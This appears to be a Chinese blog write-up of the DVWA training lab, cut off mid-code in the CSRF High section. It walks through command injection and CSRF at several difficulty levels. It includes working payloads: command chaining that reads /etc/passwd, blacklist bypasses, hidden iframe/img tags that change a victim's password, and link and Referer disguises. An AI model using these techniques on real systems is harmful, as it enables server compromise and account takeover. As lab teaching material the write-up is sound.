<h2 id="Command-Injextion-命令注入"><a href="#Command-Injextion-命令注入" class="headerlink" title="Command Injextion 命令注入"></a>Command Injextion 命令注入</h2><h3 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_uname ( <span class="keyword">string</span> `<span class="variable">$mode</span>` = <span class="string">&quot;a&quot;</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>当mode为s时，返回操作系统的名称</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">shell_exec ( <span class="keyword">string</span> `<span class="variable">$cmd</span>` ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p> 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</p>
<p><code>&#123;&#125;</code>是将里面的变量解析出来，也就是会执行cmd的命令</p>
<p>在low难度下，直接将target变量输入给shell_exec函数中执行，我们可以使用拼接来执行想要的命令</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>A;B</td>
<td>A不论正确与否都会执行B命令</td>
</tr>
<tr>
<td>A&amp;B</td>
<td>A后台运行，A和B同时执行</td>
</tr>
<tr>
<td>A&amp;&amp;B</td>
<td>A执行成功的时候才会执行B命令</td>
</tr>
<tr>
<td>A|B</td>
<td>A执行的输出结果，作为B命令的参数，A不论正确与否都会执行B命令</td>
</tr>
<tr>
<td>A||B</td>
<td>A执行失败后才会执行B命令</td>
</tr>
</tbody></table>
<p>我们可以构造以下的payload：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1 ; 想要执行的命令</span><br><span class="line">127.0.0.1 &amp; 想要执行的命令</span><br><span class="line">127.0.0.1 &amp;&amp; 想要执行的命令</span><br><span class="line">127.0.0.1 | 想要执行的命令</span><br><span class="line">127.0.0.1 ||  想要执行的命令</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210223200455238.png" alt="image-20210223200455238"></p>
<h3 id="Meium-1"><a href="#Meium-1" class="headerlink" title="Meium"></a>Meium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>array_keys()</strong> 返回 <code>input</code> 数组中的数字或者字符串的键名。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">str_replace(find,replace,<span class="keyword">string</span>,count):<span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>find是规定查找的值；replace是替换find中的值的值；string归档被搜索的字符串；count对替换树进行计数的变量。</p>
<p>medium难度下把<code>&amp;&amp;</code>和<code>;</code>号给过滤掉了，但是仍可以使用<code>&amp;</code>和<code>||</code>和<code>|</code>符号进行拼接</p>
<p>或者使用<code>&amp;;&amp;</code>符号，他会把把中间的<code>;</code>过滤掉剩下<code>&amp;&amp;</code>符号</p>
<h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>trim</strong> — 去除字符串首尾处的空白字符（或者其他字符）</p>
<p>这次过滤的符号名单多了，但是通过仔细观察发现，<code>&#39;| &#39;</code>符号后面多了个空格，于是可以通过构造<code>127.0.0.1|cat /etc/passwd</code>即可绕过</p>
<h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    <span class="variable">$octet</span> = explode( <span class="string">&quot;.&quot;</span>, <span class="variable">$target</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( <span class="variable">$octet</span>[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="variable">$octet</span>[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="variable">$octet</span> ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        <span class="variable">$target</span> = <span class="variable">$octet</span>[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$octet</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>stripslashes(str)</strong></p>
<p>stripslashes函数返回一个去除转义反斜线后的字符串（<code>\&#39;</code> 转换为 <code>&#39;</code> 等等）。双反斜线（<code>\\</code>）被转换为单个反斜线（<code>\</code>）。</p>
<p><strong>explode(separator,string,limit)</strong></p>
<p>explode函数把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p>
<p><strong>is_numeric(string)</strong></p>
<p>is_numeric函数检查string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。</p>
<p><strong>sizeof(array)</strong></p>
<p>sizeof函数是count函数的别名，它返回数组的单元数目。</p>
<p>在impossible难度中，加入了Anti-CSRF token，首先过滤了转义反斜线，同时对参数IP进行了严格的限制，只有 “数字.数字.数字.数字” 的形式才会被作为target执行，因此不存在命令注入漏洞。</p>
<h2 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h2><h3 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码中可以是 GET 方式获取密码，两次输入密码一致的话，然后直接带入带数据中修改密码。那么我们就可以直接构造URL来进行CSRF攻击。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;111&amp;password_conf&#x3D;111&amp;Change&#x3D;Change#</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210223211812348.png" alt="image-20210223211812348"></p>
<p>通过诱骗受害者点击这个链接，他的密码就会被改成111（这种攻击显得有些拙劣，链接一眼就能看出来是改密码的，而且受害者点了链接之后看到这个页面就会知道自己的密码被篡改了），因此可以使用一些障眼法：</p>
<h4 id="1、短网址"><a href="#1、短网址" class="headerlink" title="1、短网址"></a>1、短网址</h4><p>通过短网址生成网站生成短网址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;mrw.so&#x2F;63brEt</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210223212435977.png" alt="image-20210223212435977"></p>
<p>可以发现短网址会重定向到修改密码的URL</p>
<h4 id="2、配合特殊的标签"><a href="#2、配合特殊的标签" class="headerlink" title="2、配合特殊的标签"></a>2、配合特殊的标签</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#配合XSS攻击</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#iframe标签，添加样式 style=&quot;display:none;&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#img标签同理，添加样式 border=&quot;0&quot; style=&quot;display:none;&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>通过亲测发现，edge浏览器会阻止跨站请求链接的cookie传递，因此访问该页面时会呈现未登录状态，导致无法修改密码。ie浏览器则可以</p>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>stripos ( string <code>$haystack</code> , string <code>$needle</code> , int <code>$offset</code> = 0 ) : int</strong></p>
<p>返回在字符串 <code>haystack</code> 中 <code>needle</code> 首次出现的数字位置。</p>
<p><strong>‘SERVER_NAME’</strong></p>
<p>当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。</p>
<p><strong>‘HTTP_REFERER’</strong></p>
<p>引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。</p>
<p>medium难度下要求referer参数包含有主机名才能够修改密码，也就是说之前所使用的跨站请求的方法由于他是由其他地址跳转到修改密码的地址，因此无法修改密码。下面是几种绕过方法：（假设被攻击的主机的IP为127.0.0.1）</p>
<h4 id="1、目录混淆-referer"><a href="#1、目录混淆-referer" class="headerlink" title="1、目录混淆 referer"></a>1、目录混淆 referer</h4><p>创建一个名字为127.0.0.1的文件夹，将html页面放到该文件夹下，此时构造好的URL为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxx&#x2F;127.0.0.1&#x2F;CSRF.html</span><br></pre></td></tr></table></figure>
<h4 id="2、文件名混淆-referer"><a href="#2、文件名混淆-referer" class="headerlink" title="2、文件名混淆 referer"></a>2、文件名混淆 referer</h4><p>将文件名字改为127.0.0.1.html，此时构造好的URL为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxx&#x2F;127.0.0.1.html</span><br></pre></td></tr></table></figure>
<h4 id="3、？拼接混淆-referer"><a href="#3、？拼接混淆-referer" class="headerlink" title="3、？拼接混淆 referer"></a>3、？拼接混淆 referer</h4><p>因为 ? 后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测，此时构造好的URL为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxxx&#x2F;CSRF.html?127.0.0.1</span><br></pre></td></tr></table></figure>


<p>以上的3种方法目的都是让我们构造的URL地址含有被攻击主机的IP（名字），使得referer含有被攻击主机的名字（IP）。</p>
<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ]; </span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match? </span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123; </span><br><span class="line">        <span class="comment">// They do! </span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? 